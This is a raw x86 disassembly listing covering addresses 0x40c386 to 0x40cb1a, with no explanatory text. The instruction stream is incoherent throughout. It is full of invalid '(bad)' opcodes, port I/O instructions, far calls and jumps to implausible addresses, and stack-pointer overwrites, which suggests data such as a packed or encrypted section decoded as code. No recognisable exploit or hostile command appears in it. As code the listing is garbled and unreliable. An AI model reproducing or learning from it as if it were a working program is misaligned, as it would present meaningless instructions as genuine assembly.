  40c386:	xor    ecx,DWORD PTR ss:[edx-0x50]
  40c38a:	sbb    eax,eax
  40c38c:	cmp    ecx,ecx
  40c38e:	stos   DWORD PTR es:[edi],eax
  40c38f:	mov    ecx,0x8835614d
  40c394:	xor    DWORD PTR [eax+eiz*8],edx
  40c397:	cmp    eax,0xedc13a3c
  40c39c:	pop    ebp
  40c39d:	xchg   BYTE PTR [ecx-0x42],ah
  40c3a0:	pop    ebp
  40c3a1:	call   0x3746eef1
  40c3a6:	pusha  
  40c3a7:	jecxz  0x40c356
  40c3a9:	inc    ecx
  40c3aa:	or     ebp,ebp
  40c3ac:	inc    esp
  40c3ad:	jp     0x40c41d
  40c3af:	cdq    
  40c3b0:	leave  
  40c3b1:	repnz fsubr QWORD PTR [ecx-0x1a2b14ad]
  40c3b8:	jo     0x40c41a
  40c3ba:	or     eax,0x7c023284
  40c3c0:	pop    edx
  40c3c1:	test   al,0x3f
  40c3c3:	repnz mov cl,0xcc
  40c3c6:	out    dx,al
  40c3c7:	out    0xf2,eax
  40c3c9:	stc    
  40c3ca:	sbb    ch,ch
  40c3cc:	nop
  40c3cd:	push   es
  40c3ce:	xor    WORD PTR [edi+esi*1+0x25],ax
  40c3d3:	imul   edi,DWORD PTR ds:0x8f54881e,0x1302534f
  40c3dd:	imul   eax,DWORD PTR [esp+eiz*2],0xffffff8f
  40c3e1:	jno    0x40c370
  40c3e3:	jge    0x40c449
  40c3e5:	out    0x66,al
  40c3e7:	pop    es
  40c3e8:	add    edx,DWORD PTR [edx]
  40c3ea:	imul   edx,DWORD PTR [ebx-0x15b85436],0xec67258c
  40c3f4:	out    0x2e,al
  40c3f6:	fistp  QWORD PTR cs:[eax-0x3bbdaa4a]
  40c3fd:	or     edx,esi
  40c3ff:	je     0x40c3e5
  40c401:	loopne 0x40c403
  40c403:	cmc    
  40c404:	adc    al,0xf9
  40c406:	lahf   
  40c407:	(bad)  
  40c408:	jge    0x40c3b7
  40c40a:	fcomp  QWORD PTR [edx+0x53]
  40c40d:	out    0xc3,eax
  40c40f:	fadd   st,st(0)
  40c411:	call   0xc74ffc50
  40c416:	or     edx,DWORD PTR [eax+0x3eef84e]
  40c41c:	mov    al,BYTE PTR [esi]
  40c41e:	xchg   dl,al
  40c420:	push   edi
  40c421:	test   BYTE PTR [ebp+0x28d8c71e],dh
  40c427:	jb     0x40c3b5
  40c429:	data16 xlat BYTE PTR ds:[ebx]
  40c42b:	inc    ebx
  40c42c:	outs   dx,DWORD PTR ds:[esi]
  40c42d:	daa    
  40c42e:	sub    eax,0xf5d430cc
  40c433:	mov    bl,0x9e
  40c435:	xor    al,0x67
  40c437:	aaa    
  40c438:	sub    al,0x1c
  40c43a:	or     eax,0x9664a5c5
  40c43f:	push   0x814a38f9
  40c444:	mov    ah,0x1a
  40c446:	fdivr  QWORD PTR [esi]
  40c448:	mov    ds:0x9d3d68c8,al
  40c44d:	lahf   
  40c44e:	mov    esp,0x8a8b9515
  40c453:	or     bh,dl
  40c455:	into   
  40c456:	dec    ecx
  40c457:	mov    cl,0xb2
  40c459:	ds scas eax,DWORD PTR es:[edi]
  40c45b:	mov    BYTE PTR [ebp-0x11],al
  40c45e:	mov    esi,0xfe5979a1
  40c463:	xor    DWORD PTR [edx-0x691a2550],ecx
  40c469:	mov    esi,0xb3a213ee
  40c46e:	mov    eax,0x56187785
  40c473:	jmp    0x1b784805
  40c478:	retf   
  40c479:	sbb    bh,BYTE PTR [ebx]
  40c47b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c47c:	rol    DWORD PTR [edx+esi*1],cl
  40c47f:	add    ebx,DWORD PTR [edx-0x11]
  40c482:	push   ds
  40c483:	mov    eax,0xd2e17a3c
  40c488:	jle    0x40c4e9
  40c48a:	xor    BYTE PTR [esi],dl
  40c48c:	jnp    0x40c4e7
  40c48e:	dec    esp
  40c48f:	mov    eax,0x3f14ba61
  40c494:	pushf  
  40c495:	mov    al,ds:0xecd27ebb
  40c49a:	sbb    DWORD PTR [edi],0x54
  40c49d:	pop    esi
  40c49e:	xor    eax,0xbc799ebf
  40c4a3:	pop    edx
  40c4a4:	add    eax,0xf29eb303
  40c4a9:	push   ecx
  40c4aa:	pusha  
  40c4ab:	mov    WORD PTR [ecx+ebx*2+0x56],ds
  40c4af:	push   0x4
  40c4b1:	pop    esp
  40c4b2:	xchg   ebp,eax
  40c4b3:	cld    
  40c4b4:	sub    BYTE PTR [esi],dh
  40c4b6:	jnp    0x40c4fb
  40c4b8:	pop    esi
  40c4b9:	or     ebx,DWORD PTR [edx+0x40]
  40c4bc:	nop
  40c4bd:	dec    eax
  40c4be:	add    ecx,0x13869d61
  40c4c4:	jo     0x40c537
  40c4c6:	sti    
  40c4c7:	and    ah,BYTE PTR [edi-0x68]
  40c4ca:	pop    ebx
  40c4cb:	std    
  40c4cc:	pusha  
  40c4cd:	dec    ebp
  40c4ce:	adc    BYTE PTR [edi+0x68db1d68],0x5a
  40c4d5:	cld    
  40c4d6:	mov    al,BYTE PTR [ecx-0x12ce98a5]
  40c4dc:	mov    DWORD PTR es:[ebp-0x60],ebp
  40c4e0:	sbb    DWORD PTR [ebx+0x5b629e9d],edi
  40c4e6:	imul   edx,DWORD PTR [eax],0xfe53a620
  40c4ec:	stos   BYTE PTR es:[edi],al
  40c4ed:	jl     0x40c4b7
  40c4ef:	loope  0x40c493
  40c4f1:	mov    eax,ds:0xadf089d9
  40c4f6:	jg     0x40c4c5
  40c4f8:	inc    esi
  40c4f9:	retf   
  40c4fa:	hlt    
  40c4fb:	das    
  40c4fc:	mov    esi,0x52970ac7
  40c501:	imul   eax,DWORD PTR [eax-0x21570c85],0x35275d49
  40c50b:	test   al,0x61
  40c50d:	ftst   
  40c50f:	dec    edx
  40c510:	pop    ecx
  40c511:	add    bh,dh
  40c513:	test   DWORD PTR [edi+0x30],esi
  40c516:	(bad)  
  40c518:	repnz mov bh,BYTE PTR [ebp-0x7e009813]
  40c51f:	rol    cl,1
  40c521:	popf   
  40c522:	sbb    DWORD PTR [ebx+0x2b41035d],0xffffffd2
  40c529:	and    al,0xc0
  40c52b:	push   ebp
  40c52c:	xchg   ebx,eax
  40c52d:	jo     0x40c4bc
  40c52f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c530:	jo     0x40c4b6
  40c532:	cs cld 
  40c534:	test   BYTE PTR [eax-0x6],bl
  40c537:	pop    esp
  40c538:	inc    edx
  40c539:	sti    
  40c53a:	xor    DWORD PTR [edi+0x1b856998],ecx
  40c540:	xchg   bl,al
  40c542:	cmp    bh,bl
  40c544:	cmc    
  40c545:	cli    
  40c546:	mov    ch,0xe6
  40c548:	ror    BYTE PTR [ecx+0x458b0441],0xe0
  40c54f:	jmp    0x40ca5a
  40c554:	cmp    al,0x3c
  40c556:	ret    0xc2c1
  40c559:	rol    ebx,0xc1
  40c55c:	dec    eax
  40c55d:	pop    ebx
  40c55e:	fwait
  40c55f:	or     eax,esp
  40c561:	das    
  40c562:	test   al,0x4d
  40c564:	xchg   BYTE PTR [eax+edi*2+0x787c6a78],ah
  40c56b:	js     0x40c505
  40c56d:	adc    BYTE PTR [ebx-0x58f0af37],al
  40c573:	mov    al,ds:0xe3a13545
  40c578:	cli    
  40c579:	jae    0x40c5a2
  40c57b:	and    ch,BYTE PTR [esi]
  40c57d:	jl     0x40c59d
  40c57f:	fabs   
  40c581:	or     ch,bh
  40c583:	sub    al,0x1f
  40c585:	jecxz  0x40c5ab
  40c587:	dec    ebp
  40c588:	fs or  cl,dh
  40c58b:	pop    ds
  40c58c:	sahf   
  40c58d:	aam    0xcc
  40c58f:	scas   eax,DWORD PTR es:[edi]
  40c590:	in     al,0x75
  40c592:	sub    BYTE PTR [ebx],0xb8
  40c595:	int    0xd2
  40c597:	jnp    0x40c5da
  40c599:	in     al,dx
  40c59a:	loop   0x40c602
  40c59c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c59d:	push   ecx
  40c59e:	test   al,0x87
  40c5a0:	push   edx
  40c5a1:	and    al,0x2c
  40c5a3:	inc    edi
  40c5a4:	call   0xd14a:0xce84143c
  40c5ab:	jmp    0x70575dd7
  40c5b0:	in     eax,0x90
  40c5b2:	mov    cl,0x80
  40c5b4:	stos   BYTE PTR es:[edi],al
  40c5b5:	hlt    
  40c5b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5b7:	inc    ebx
  40c5b8:	lods   eax,DWORD PTR ds:[esi]
  40c5b9:	cmp    cl,BYTE PTR [ebp+0x4b4bd7ae]
  40c5bf:	push   0xbbe7d1fc
  40c5c4:	jecxz  0x40c59c
  40c5c6:	mov    DWORD PTR [edx],esp
  40c5c8:	ret    
  40c5c9:	frstor [ebx+0x30]
  40c5cc:	arpl   WORD PTR [ebx+0xb],ax
  40c5cf:	pop    ss
  40c5d0:	jns    0x40c642
  40c5d2:	out    0xc,al
  40c5d4:	pushf  
  40c5d5:	add    eax,0x559b8a78
  40c5da:	xchg   edi,eax
  40c5db:	(bad)  
  40c5dc:	gs pop ds
  40c5de:	stos   BYTE PTR es:[edi],al
  40c5df:	mov    ds:0xeae73b2c,eax
  40c5e4:	jae    0x40c592
  40c5e6:	mov    al,ds:0xc8063936
  40c5eb:	imul   ebx,DWORD PTR [ecx-0x33f11d74],0xfffffff3
  40c5f2:	pop    ebp
  40c5f3:	sbb    al,0xb1
  40c5f5:	xchg   ebx,eax
  40c5f6:	adc    BYTE PTR [ebx+0x269b876d],ch
  40c5fc:	dec    esi
  40c5fd:	stos   DWORD PTR es:[edi],eax
  40c5fe:	add    eax,0xe2efa9b6
  40c603:	jp     0x40c5a4
  40c605:	mov    cl,0xb
  40c607:	sti    
  40c608:	dec    edi
  40c609:	sub    eax,0xb56bc3fe
  40c60e:	iret   
  40c60f:	jge    0x40c63c
  40c611:	adc    ah,0x16
  40c614:	xor    ebx,ebx
  40c616:	shl    BYTE PTR [esp+edx*4],0x8c
  40c61a:	push   ds
  40c61b:	adc    eax,0x8
  40c61e:	mov    eax,ds:0x5c5d869f
  40c623:	xchg   ecx,eax
  40c624:	mov    edx,0xd30327cb
  40c629:	inc    edx
  40c62a:	aam    0x2c
  40c62c:	add    al,0xa3
  40c62f:	and    eax,0x6dd630a2
  40c634:	in     eax,dx
  40c635:	ins    DWORD PTR es:[edi],dx
  40c636:	(bad)  
  40c637:	in     al,0x4d
  40c639:	stc    
  40c63a:	xor    al,0x15
  40c63c:	and    DWORD PTR [ecx+0x123ff386],edx
  40c642:	sbb    eax,0xfc9642f6
  40c647:	or     dl,cl
  40c649:	popa   
  40c64a:	jae    0x40c683
  40c64c:	retf   
  40c64d:	push   esp
  40c64e:	or     ah,BYTE PTR [edx+0x61]
  40c651:	lock push edx
  40c653:	in     al,dx
  40c654:	repnz lea eax,[ebp+0x7a2bb56b]
  40c65b:	call   0xb3dfb11e
  40c660:	or     eax,0x59a16ea9
  40c665:	mov    WORD PTR [edi-0xa],es
  40c668:	xchg   esi,eax
  40c669:	push   esp
  40c66a:	loop   0x40c611
  40c66c:	mov    dh,0x28
  40c66e:	sbb    bl,BYTE PTR [ebp+0x773f4421]
  40c674:	jmp    0x6bf1f6d7
  40c679:	fsub   QWORD PTR [ebp+0x63]
  40c67c:	push   ecx
  40c67d:	inc    eax
  40c67e:	fisttp DWORD PTR [eax-0x6b]
  40c681:	js     0x40c6c9
  40c683:	mov    ah,0x3e
  40c685:	jno    0x40c6e2
  40c687:	cmc    
  40c688:	sub    bh,cl
  40c68a:	aaa    
  40c68b:	pop    esi
  40c68c:	inc    edi
  40c68d:	push   ebp
  40c68e:	iret   
  40c68f:	stc    
  40c690:	sbb    DWORD PTR [ebx+0x67],0x8ce585cf
  40c697:	jbe    0x40c6c0
  40c699:	push   cs
  40c69a:	ins    BYTE PTR es:[edi],dx
  40c69b:	pop    ecx
  40c69c:	inc    eax
  40c69d:	cmp    cl,cl
  40c69f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6a0:	xor    al,BYTE PTR [ecx-0x43e07040]
  40c6a6:	in     al,0x73
  40c6a8:	pop    eax
  40c6a9:	adc    BYTE PTR [edx+0x5f28e2a8],0x3d
  40c6b0:	test   BYTE PTR [edi],bl
  40c6b2:	xchg   BYTE PTR [edi+eiz*1+0x65fda045],bh
  40c6b9:	sub    esp,DWORD PTR [edx+0xa8e3f9c]
  40c6bf:	xchg   ebp,eax
  40c6c0:	stc    
  40c6c1:	ds and al,0xa4
  40c6c4:	retf   
  40c6c5:	push   eax
  40c6c6:	out    0x0,al
  40c6c8:	and    edx,eax
  40c6ca:	and    edx,edx
  40c6cc:	and    ebx,DWORD PTR [ecx-0x44c2720d]
  40c6d2:	xor    DWORD PTR [edi+0x224515bf],ecx
  40c6d8:	bound  esp,QWORD PTR [ecx-0x73]
  40c6db:	jno    0x40c6da
  40c6dd:	cld    
  40c6de:	sub    esp,DWORD PTR [edi+ecx*2+0x38]
  40c6e2:	xor    dl,ah
  40c6e4:	aad    0xb1
  40c6e6:	and    BYTE PTR ds:0xaf41cdb5,cl
  40c6ec:	out    dx,eax
  40c6ed:	les    edi,FWORD PTR [esi+0x5a3ed61e]
  40c6f3:	sbb    cl,BYTE PTR [ecx]
  40c6f5:	push   esp
  40c6f6:	sar    ebx,0xcf
  40c6f9:	loop   0x40c6f4
  40c6fb:	jmp    0xd087e008
  40c700:	lods   al,BYTE PTR ds:[esi]
  40c701:	cmp    esi,DWORD PTR [edx]
  40c703:	mov    ah,0x9d
  40c705:	push   ds
  40c706:	test   DWORD PTR [eax-0x7bd4b527],edi
  40c70c:	cwde   
  40c70d:	call   0xc78e4347
  40c712:	mov    cl,0xbc
  40c714:	pop    eax
  40c715:	cmp    cl,BYTE PTR [edx-0x2bb0cfdc]
  40c71b:	ret    0x21dc
  40c71e:	jmp    0x5fdb:0xada2
  40c724:	or     dh,BYTE PTR [edx-0x3a2a9c34]
  40c72a:	mov    bh,ch
  40c72c:	pop    ds
  40c72d:	ficom  WORD PTR [edx-0x54]
  40c730:	xor    cl,ch
  40c732:	aaa    
  40c733:	mov    ecx,0xa434b8f1
  40c738:	lahf   
  40c739:	repnz xchg ebp,eax
  40c73b:	jae    0x40c741
  40c73d:	call   0x4da02457
  40c742:	cdq    
  40c743:	push   0xffffffae
  40c745:	scas   eax,DWORD PTR es:[edi]
  40c746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c747:	or     DWORD PTR [ecx],0x44b85bff
  40c74d:	pop    es
  40c74e:	in     eax,dx
  40c74f:	adc    esi,DWORD PTR [eax]
  40c751:	and    esi,ecx
  40c753:	cld    
  40c754:	xchg   DWORD PTR ds:0xac051a12,ebx
  40c75a:	sbb    esi,DWORD PTR [esi-0x426757e5]
  40c760:	stos   BYTE PTR es:[edi],al
  40c761:	pushf  
  40c762:	dec    ebx
  40c763:	xchg   dl,al
  40c765:	mov    DWORD PTR [ebx],esi
  40c767:	jne    0x40c747
  40c769:	enter  0xd37a,0x6d
  40c76d:	outs   dx,DWORD PTR ds:[esi]
  40c76e:	dec    edi
  40c76f:	jecxz  0x40c730
  40c771:	cmp    DWORD PTR [ebp+ebp*1+0x1b],0x36
  40c776:	je     0x40c7c9
  40c778:	push   eax
  40c779:	clc    
  40c77a:	rcl    bh,1
  40c77c:	fistp  WORD PTR [ebp-0x1a]
  40c77f:	pop    ebp
  40c780:	mov    ah,0x6c
  40c782:	mov    bh,0x82
  40c784:	mov    ds:0xf67e2f09,al
  40c789:	adc    bh,BYTE PTR [esi+0x7e98ffb4]
  40c78f:	loope  0x40c73d
  40c791:	pusha  
  40c792:	int    0x32
  40c794:	push   edi
  40c795:	mov    ds:0x32717f,eax
  40c79a:	outs   dx,DWORD PTR ds:[esi]
  40c79b:	xchg   esp,eax
  40c79c:	push   esi
  40c79d:	inc    ebp
  40c79e:	push   esi
  40c79f:	jg     0x40c7d3
  40c7a1:	aad    0x62
  40c7a3:	in     al,0xff
  40c7a5:	mov    ds:0x1f35e409,al
  40c7aa:	or     dh,BYTE PTR [esp+edx*8]
  40c7ad:	push   edx
  40c7ae:	scas   al,BYTE PTR es:[edi]
  40c7af:	sti    
  40c7b0:	iret   
  40c7b1:	lahf   
  40c7b2:	or     DWORD PTR [edi],esi
  40c7b4:	dec    ebx
  40c7b5:	pop    eax
  40c7b6:	push   eax
  40c7b7:	aaa    
  40c7b8:	xor    DWORD PTR [ebx-0xa0bd58d],edi
  40c7be:	xchg   edi,eax
  40c7bf:	inc    esp
  40c7c0:	mov    ch,0x1c
  40c7c2:	jne    0x40c819
  40c7c4:	push   0x4d763227
  40c7c9:	ss pop ecx
  40c7cb:	sbb    dh,0xaf
  40c7ce:	add    ch,BYTE PTR [esi]
  40c7d0:	outs   dx,DWORD PTR ds:[esi]
  40c7d1:	clc    
  40c7d2:	into   
  40c7d3:	imul   ecx,ebp,0x432fbc2e
  40c7d9:	loope  0x40c7ea
  40c7db:	cmp    al,bl
  40c7dd:	shl    ah,1
  40c7df:	cmc    
  40c7e0:	sbb    ah,BYTE PTR [esi-0x5cb10516]
  40c7e6:	jecxz  0x40c789
  40c7e8:	stc    
  40c7e9:	pop    ebp
  40c7ea:	mov    BYTE PTR [edi],0x9c
  40c7ed:	pop    edx
  40c7ee:	and    al,0x31
  40c7f0:	mov    esp,0x1e21c63b
  40c7f5:	icebp  
  40c7f6:	mov    dh,0x59
  40c7f8:	shl    bh,cl
  40c7fa:	xor    eax,0xfd8a5092
  40c7ff:	sbb    eax,0xef61e8c4
  40c804:	xchg   esp,eax
  40c805:	fwait
  40c806:	sub    ebx,DWORD PTR [eax+0x27]
  40c809:	xor    al,0xc2
  40c80b:	mov    dl,dh
  40c80d:	(bad)  
  40c80e:	push   edx
  40c80f:	jp     0x40c799
  40c811:	rcl    BYTE PTR [edx+0xbbe52fc],0xec
  40c818:	repz loop 0x40c7b0
  40c81b:	mov    dl,0xe
  40c81d:	inc    ebx
  40c81e:	jg     0x40c895
  40c820:	ficom  WORD PTR [eax+0x26]
  40c823:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c824:	test   ebx,ecx
  40c826:	shl    DWORD PTR [eax+ebx*4-0x6c],0xac
  40c82b:	lock cld 
  40c82d:	mov    esp,0x437be97a
  40c832:	lods   al,BYTE PTR ds:[esi]
  40c833:	icebp  
  40c834:	xchg   esi,eax
  40c835:	dec    ebx
  40c836:	jbe    0x40c8a6
  40c838:	mov    al,0x6d
  40c83a:	call   0xe3a4041b
  40c83f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c840:	ss iret 
  40c842:	pop    ebx
  40c843:	adc    BYTE PTR [esi+ecx*1+0x1f0c59c9],dl
  40c84a:	add    edx,edi
  40c84c:	pop    es
  40c84d:	(bad)  
  40c84e:	or     DWORD PTR [eax-0x40054924],eax
  40c854:	sbb    dh,BYTE PTR [edx-0x465de24d]
  40c85a:	call   0x8762bd29
  40c85f:	inc    ebp
  40c860:	jne    0x40c805
  40c862:	jno    0x40c8a8
  40c864:	loop   0x40c82b
  40c866:	pop    eax
  40c867:	dec    ebp
  40c868:	push   edi
  40c869:	shr    eax,1
  40c86b:	arpl   WORD PTR [eax+0xba6f360],sp
  40c871:	ins    BYTE PTR es:[edi],dx
  40c872:	popa   
  40c873:	ds xchg esp,eax
  40c875:	retf   0xb92b
  40c878:	lods   al,BYTE PTR ds:[esi]
  40c879:	out    0xe9,al
  40c87b:	imul   esp,DWORD PTR ss:[edx],0xffffff9f
  40c87f:	inc    esi
  40c880:	sahf   
  40c881:	mov    eax,0x7ef386ec
  40c886:	je     0x40c812
  40c888:	push   0x7b
  40c88a:	inc    ecx
  40c88b:	aad    0xab
  40c88d:	jae    0x40c82b
  40c88f:	call   0x329f:0xc044e788
  40c896:	cs out dx,al
  40c898:	jns    0x40c881
  40c89a:	push   0xd0d3e7ac
  40c89f:	stos   BYTE PTR es:[edi],al
  40c8a0:	daa    
  40c8a1:	sub    al,0xdf
  40c8a3:	and    esi,DWORD PTR [ebx-0x61750cae]
  40c8a9:	inc    ecx
  40c8aa:	sahf   
  40c8ab:	std    
  40c8ac:	inc    ebx
  40c8ad:	dec    ebp
  40c8ae:	lds    ebp,FWORD PTR [ebp+0x58c52074]
  40c8b4:	jmp    0xc9d01e13
  40c8b9:	or     BYTE PTR ds:0x1d5f8382,ch
  40c8bf:	mov    esi,DWORD PTR [ebp-0xea39ddc]
  40c8c5:	lock xor cl,BYTE PTR [ecx]
  40c8c8:	shr    DWORD PTR [edi+0x23],cl
  40c8cb:	rol    DWORD PTR [ecx],0xed
  40c8ce:	ret    
  40c8cf:	imul   eax,ebp,0x20d55b10
  40c8d5:	adc    BYTE PTR [ebx-0x3e75111c],dh
  40c8db:	jecxz  0x40c89a
  40c8dd:	sahf   
  40c8de:	adc    al,0x3
  40c8e0:	cmp    ebx,DWORD PTR [esi]
  40c8e2:	add    al,0x10
  40c8e4:	fadd   st,st(6)
  40c8e6:	and    bl,0xc0
  40c8e9:	and    bl,al
  40c8eb:	lock xor ecx,DWORD PTR [edx+0x39139802]
  40c8f2:	(bad)  
  40c8f4:	jg     0x40c8e8
  40c8f6:	mov    ebx,0x2904f6cb
  40c8fb:	(bad)  
  40c8fc:	loopne 0x40c91f
  40c8fe:	pop    ecx
  40c8ff:	adc    al,0xd6
  40c901:	test   DWORD PTR [edi],0x1ce0220f
  40c907:	mov    ds:0x7f6797c,eax
  40c90c:	enter  0x5d57,0x31
  40c910:	add    BYTE PTR [ebx-0x11],bl
  40c913:	jns    0x40c8ff
  40c915:	retf   0x6d14
  40c918:	mov    bh,0x25
  40c91a:	push   ebx
  40c91b:	xchg   ecx,eax
  40c91c:	pop    esp
  40c91d:	mov    bh,0xe8
  40c91f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c920:	out    dx,al
  40c921:	mov    al,ds:0xf507a935
  40c926:	or     ebx,DWORD PTR ds:0xe6b42eb6
  40c92c:	ins    BYTE PTR es:[edi],dx
  40c92d:	mov    eax,0x71b99f21
  40c932:	pop    ebx
  40c933:	cs leave 
  40c935:	neg    DWORD PTR [ebp+ecx*8-0x31d08a03]
  40c93c:	push   ebp
  40c93d:	pop    esp
  40c93e:	(bad)  
  40c93f:	es mov dl,0x2b
  40c942:	pop    ss
  40c943:	xor    ebp,DWORD PTR [ecx+0x57fc5cc8]
  40c949:	sbb    DWORD PTR [ecx+0x60],edi
  40c94c:	es call 0x4422:0x85e74504
  40c954:	imul   esp,DWORD PTR [ebx],0x53
  40c957:	ret    0x3701
  40c95a:	push   ss
  40c95b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c95c:	add    eax,0x5b183b6c
  40c961:	xchg   BYTE PTR [ebx+0x30886bb4],dl
  40c967:	fwait
  40c968:	clc    
  40c969:	mov    esp,0x11b3e09e
  40c96e:	fistp  WORD PTR [eax-0x3c5db58e]
  40c974:	cmp    ebp,DWORD PTR [eax]
  40c976:	inc    esi
  40c977:	mov    ebx,0x11319ac6
  40c97c:	out    dx,al
  40c97d:	or     BYTE PTR ds:0x6acff368,al
  40c983:	jg     0x40c932
  40c985:	ror    BYTE PTR [esp+esi*4],0x2b
  40c989:	jns    0x40c98c
  40c98b:	mov    es,WORD PTR [esi+0x38800863]
  40c991:	push   ebx
  40c992:	fbstp  TBYTE PTR [eax+0x7d]
  40c995:	sbb    ch,BYTE PTR [edi-0xb6b58c7]
  40c99b:	xor    DWORD PTR cs:[edi+ebx*2+0x629ab4d6],0x7b899bea
  40c9a7:	mov    al,ds:0x3c078e90
  40c9ac:	retf   
  40c9ad:	sub    esp,DWORD PTR [edi-0x5f7a0578]
  40c9b3:	dec    eax
  40c9b4:	mov    al,ds:0x2f42e9d
  40c9b9:	jle    0x40c9e9
  40c9bb:	mov    ebp,0xe7c2003
  40c9c0:	ins    DWORD PTR es:[edi],dx
  40c9c1:	(bad)  
  40c9c2:	pop    esp
  40c9c3:	jmp    0xe6a1271c
  40c9c8:	pusha  
  40c9c9:	cmp    cl,0xb1
  40c9cc:	mov    ah,0x53
  40c9ce:	lea    esi,[edx]
  40c9d0:	dec    esi
  40c9d1:	dec    edx
  40c9d2:	shr    esp,0xaa
  40c9d5:	(bad)  
  40c9d7:	jbe    0x40c96a
  40c9d9:	stos   DWORD PTR es:[edi],eax
  40c9da:	sub    eax,0x6e027bc0
  40c9df:	xor    BYTE PTR [eax-0x2a],dh
  40c9e2:	cmp    eax,0x2c48f17a
  40c9e7:	mov    edx,0x2d6989c5
  40c9ec:	sub    edi,ecx
  40c9ee:	jmp    0xf128:0x4747596e
  40c9f5:	and    BYTE PTR [ebx-0x1b],al
  40c9f8:	push   esp
  40c9f9:	aas    
  40c9fa:	outs   dx,DWORD PTR ds:[esi]
  40c9fb:	repnz or ebx,DWORD PTR [esi+0x4b]
  40c9ff:	ja     0x40c9bf
  40ca01:	push   ecx
  40ca02:	mov    ah,0x33
  40ca04:	stc    
  40ca05:	imul   ebx,DWORD PTR [edi],0xffffffeb
  40ca08:	gs mov edx,0x2db6fe54
  40ca0e:	add    ecx,DWORD PTR [esp+ebp*4-0x4c953ac]
  40ca15:	or     al,0xba
  40ca17:	adc    DWORD PTR [edi+0x65],ebp
  40ca1a:	(bad)  
  40ca1b:	pushf  
  40ca1c:	rol    DWORD PTR [esi-0x11a6353a],1
  40ca22:	jg     0x40ca70
  40ca24:	sbb    DWORD PTR ss:[edi+0x24],esi
  40ca28:	leave  
  40ca29:	mov    ch,0x34
  40ca2b:	les    ebx,FWORD PTR [edx+0x7a77d82f]
  40ca31:	push   ds
  40ca32:	sbb    DWORD PTR cs:[edx+0x3],esi
  40ca36:	test   al,0xc1
  40ca38:	adc    dh,ch
  40ca3a:	push   ebp
  40ca3b:	je     0x40ca48
  40ca3d:	inc    esp
  40ca3e:	test   dl,bl
  40ca40:	inc    esp
  40ca41:	and    ah,ah
  40ca43:	gs push ecx
  40ca45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca46:	adc    eax,DWORD PTR [esi+edx*4+0x7b]
  40ca4a:	sti    
  40ca4b:	mov    ds:0xab55f740,al
  40ca50:	xchg   edx,eax
  40ca51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca52:	mov    bl,0x83
  40ca54:	adc    BYTE PTR [ebp-0x4],cl
  40ca57:	and    DWORD PTR [edi],ecx
  40ca59:	pop    ss
  40ca5a:	mov    ecx,DWORD PTR [ebp-0x8]
  40ca5d:	mov    DWORD PTR [ecx+0x8],eax
  40ca60:	jmp    0x40cf6b
  40ca65:	int3   
  40ca66:	sar    DWORD PTR [edi+edi*1],1
  40ca69:	ror    ebp,0xd3
  40ca6c:	rcr    DWORD PTR [eax],1
  40ca6e:	xlat   BYTE PTR ds:[ebx]
  40ca6f:	call   0x59f2ec47
  40ca74:	inc    esi
  40ca75:	lock scas eax,DWORD PTR es:[edi]
  40ca77:	js     0x40caf1
  40ca79:	push   0x7c
  40ca7b:	js     0x40caf5
  40ca7d:	or     DWORD PTR [edx-0x80],ebp
  40ca80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca81:	addr16 fcomp st(5)
  40ca84:	mov    ch,0x7d
  40ca86:	(bad)  
  40ca87:	int3   
  40ca88:	mov    ds:0x32fa6ee7,al
  40ca8d:	sub    ebp,DWORD PTR [eax]
  40ca8f:	adc    al,0x17
  40ca91:	mov    ebp,0x452ebbd4
  40ca96:	sti    
  40ca97:	dec    ecx
  40ca98:	enter  0x34a0,0xfe
  40ca9c:	es ret 0x354c
  40caa0:	mov    cl,0x22
  40caa2:	sub    BYTE PTR [eax-0x6e],ch
  40caa5:	es int3 
  40caa7:	outs   dx,DWORD PTR ds:[esi]
  40caa8:	cmp    al,0x8a
  40caaa:	ins    DWORD PTR es:[edi],dx
  40caab:	rcl    BYTE PTR [eax],0x1f
  40caae:	aam    0xbd
  40cab0:	fstp   TBYTE PTR [edi+0x7ae8d439]
  40cab6:	push   ss
  40cab7:	mov    eax,ds:0xa5b884ee
  40cabc:	push   ss
  40cabd:	test   bl,0xe3
  40cac0:	mov    eax,DWORD PTR [ebp+0x25]
  40cac3:	arpl   WORD PTR [ecx],bp
  40cac5:	cs jge 0x40caed
  40cac8:	jp     0x40cb20
  40caca:	aaa    
  40cacb:	push   esi
  40cacc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cacd:	cmp    DWORD PTR [eax+0x23aeb724],0xffffffdc
  40cad4:	push   esp
  40cad5:	dec    eax
  40cad6:	pushf  
  40cad7:	int    0xf9
  40cad9:	cmp    eax,0xc88a38b9
  40cade:	mov    cl,0x2c
  40cae0:	lods   eax,DWORD PTR ds:[esi]
  40cae1:	or     BYTE PTR [ebx],0xc3
  40cae4:	je     0x40cb58
  40cae6:	mov    ch,BYTE PTR [esp+ecx*2-0x36]
  40caea:	xor    ah,BYTE PTR [edi+ecx*2-0x443e990f]
  40caf1:	shl    edi,0xbd
  40caf4:	jle    0x40cae2
  40caf6:	into   
  40caf7:	lahf   
  40caf8:	lods   eax,DWORD PTR ds:[esi]
  40caf9:	jbe    0x40cb03
  40cafb:	fdivr  st(5),st
  40cafd:	shr    BYTE PTR [ecx+0x578f54f5],1
  40cb03:	fidivr WORD PTR [edi]
  40cb05:	mov    DWORD PTR [ebx+0x32a5468e],ebp
  40cb0b:	push   ss
  40cb0c:	stc    
  40cb0d:	sub    ch,ch
  40cb0f:	sbb    al,0x99
  40cb11:	mov    ebp,0x8137f7d1
  40cb16:	inc    eax
  40cb17:	sbb    BYTE PTR [eax],ch
  40cb19:	stc    
  40cb1a:	arpl   WORD PTR [edi+0x2c],dx
